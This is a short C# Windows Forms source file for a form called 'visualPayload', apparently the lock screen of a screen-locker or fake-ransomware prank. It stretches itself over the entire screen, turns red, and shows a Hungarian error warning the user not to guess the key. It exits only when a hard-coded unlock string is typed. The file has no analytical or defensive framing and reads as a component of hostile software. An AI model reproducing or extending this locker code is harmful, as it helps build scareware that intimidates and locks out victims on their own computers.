using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace pöcs_balek
{
    public partial class visualPayload : Form
    {
        public visualPayload()
        {
            InitializeComponent();
        }

        private void visualPayload_Load(object sender, EventArgs e)
        {
            this.Left = 0;
            this.Top = 0;
            this.Width = Screen.PrimaryScreen.Bounds.Width;
            this.Height = Screen.PrimaryScreen.Bounds.Height;
            hibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahibahiba.BackColor = Color.Red;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {

                MessageBox.Show("Rosszul választott kulcsot, ellenőrizze, hogy helyesen írta - e be.Ne próbáld kitalálni.", "A kulcsod téves volt", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if (textBox1.Text == "8391238jdf")
            {
                Application.Exit();
            }
        }
    }
}
